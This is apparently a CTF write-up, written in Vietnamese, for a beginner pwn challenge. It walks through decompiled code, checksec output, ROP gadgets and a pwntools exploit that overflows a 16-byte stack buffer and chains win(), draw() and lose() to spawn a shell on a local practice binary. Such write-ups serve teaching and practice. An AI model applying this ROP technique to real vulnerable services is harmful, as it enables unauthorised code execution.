---
title: "Pwn2 - MiniCTF - PTITHCM"
date: 2024-01-04 00:00:00 +0700
categories: [CTF, Binary Exploitation]
tags: [pwn, ret2win, rop, stack-overflow, ptithcm]
author: datious
description: "MiniCTF PTITHCM Pwn2 writeup — ret2win with ROP chain through win() → draw() → lose() to get shell."
---

# Pwn2 - MiniCTF - PTITHCM
**Author: D1n0_09_N24DCAT015**

*Đầu tiên khi nhìn vô tên file ta có thể nghĩ ngay tới việc return vào hàm win()*

## 1. Sơ lược về chương trình

Dùng tool **Ghidra** để xem source code hàm main của chương trình:

```c
undefined8 main(void)
{
  undefined1 local_18 [16];
  
  printf("Just ret2win ez maybe ChatGPT can solve !!!!!");
  FUN_00401080("%256s", local_18);
  return 0;
}
```

→ Buffer overflow tại đây (buffer 16 bytes nhưng đọc tới 256 bytes).

**Các hàm khác trong chương trình:**

```c
void win(int param_1)
{
  if (param_1 == 0x1337) {
    check2 = 0xcafebabe;
  }
  return;
}

void draw(int param_1, int param_2)
{
  if (((param_1 == 0x7331) && (param_2 == -0x789abcdf)) && (check2 == -0x35014542)) {
    check3 = 0x12345678;
  }
  return;
}

void lose(int param_1)
{
  if (((param_1 == -0x21524111) && (check2 == -0x35014542)) && (check3 == 0x12345678)) {
    system("/bin/echo FLAG: PIS{!!!!!!!!!!PWN!!!!!!!!!!}");
    system("sh");
  }
  else {
    system("/bin/echo FLAG: PIS{!!!!!!!!!!PWN!!!!!!!!!!}");
  }
  return;
}
```

→ Luồng cần đi: `win()` → `draw()` → `lose()` để thực thi `system("sh")`.

## 2. Security Layers

```
gef➤  checksec
[+] checksec for '/home/kali/Downloads/mini/ret2win'
Canary    : ✘ 
NX        : ✓ 
PIE       : ✘ 
Fortify   : ✘ 
RelRO     : Partial
```

→ **Canary disabled**, hoàn toàn có thể ghi đè save RIP.

## 3. Khai thác

**Xác định offset:**

![GDB offset](https://hackmd.io/_uploads/ryBhuOQx-l.png)

→ Offset = **24 bytes** để đến save RIP.

**Gadgets tìm được:**

```
0x000000000040117e : pop rdi ; ret
0x0000000000401180 : pop rsi ; pop rbx ; ret
```

**Điều kiện cần thỏa:**
- `win(param_1)`: `param_1 == 0x1337`
- `draw(param_1, param_2)`: `param_1 == 0x7331`, `param_2 == -0x789abcdf` (= `0x87654321`)
- `lose(param_1)`: `param_1 == -0x21524111` (= `0xdeadbeef`)

## 4. Exploit Script

```python
#!/usr/bin/python3
from pwn import *

exe = ELF('./ret2win', checksec=False)
p = process(exe.path)

pop_rdi = 0x000000000040117e
pop_rsi = 0x0000000000401180
ret     = 0x000000000040101a

payload  = b'A' * 24

# Call win(0x1337)
payload += p64(pop_rdi) + p64(0x1337)
payload += p64(exe.sym['win'])

# Stack alignment
payload += p64(ret)

# Call draw(0x7331, 0x87654321)
payload += p64(pop_rdi) + p64(0x7331)
payload += p64(pop_rsi) + p64(0x87654321) + p64(0x0)
payload += p64(exe.sym['draw'])

payload += p64(ret)

# Call lose(0xdeadbeef)
payload += p64(pop_rdi) + p64(0xdeadbeef)
payload += p64(exe.sym['lose'])

p.sendline(payload)
p.interactive()
```

![Flag](https://hackmd.io/_uploads/SJNTq_QxZg.png)

**Done! 🎉**
